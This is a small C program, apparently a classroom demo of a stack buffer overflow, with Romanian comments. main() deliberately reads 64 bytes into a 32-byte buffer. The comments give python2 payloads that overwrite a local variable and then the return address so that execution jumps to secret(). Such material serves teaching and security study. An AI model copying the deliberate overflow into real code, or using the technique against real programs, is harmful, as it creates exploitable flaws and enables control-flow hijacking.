#include <stdio.h>
#include <string.h>
#include <stdlib.h>

void secret(int a) {
    printf("Gotcha\n");

    if (a == 0x12345678) {
        printf("Super secret\n");
    }
}

void bye() {
    exit(0);
}

/**
 * 
 * Payload:
 * - (0x2c - 0x8) octeti random ca sa umplem bufferul pana la a
 * - 0x00abcdef little endian
 * 
 * python2 -c 'print (0x2c - 0x8) * "A" + "\xef\xcd\xab\00"' | ./demo
 */

/**
 * Payload:
 * - (0x2c - 0x8) octeti random ca sa umplem bufferul pana la a
 * - 0x00abcdef little endian
 * - (0x8 - 4) octeti random pana la ebp (0x8 = offsetul lui a, 4 = dim lui a)
 * - 4 octeti random pentru vechiul ebp
 * - adresa lui secret in little endian (nm demo | grep secret)
 * 
 * [ebp + 4]: ret addr
 * dmesg | tail -n 2 => ca sa vedeti la ce adr a fost segfault
 * 
 * python2 -c 'print (0x2c - 0x8) * "A" + "\xef\xcd\xab\x00" + (0x8 - 4 + 4) * "A" + "\x16\x92\x04\x08"' | ./demo
 */

int main(void)
{
	// a: [ebp-0x8]
	unsigned int a = 1;
	// buffer: [ebp - 0x2c]
	char buffer[32];
	size_t i, len;

	printf("insert buffer string:\n");
	fgets(buffer, 64, stdin);

	printf("buffer is:\n");
	len = strlen(buffer);
	for (i = 0; i < len; i++)
		printf(" %02hhx(%c)", buffer[i], buffer[i]);
	puts("");

	if (a == 0x00abcdef)
		printf("Full of win!\n");
	else
		printf("Not quite there. Try again!\n");
	
	return 0;
}
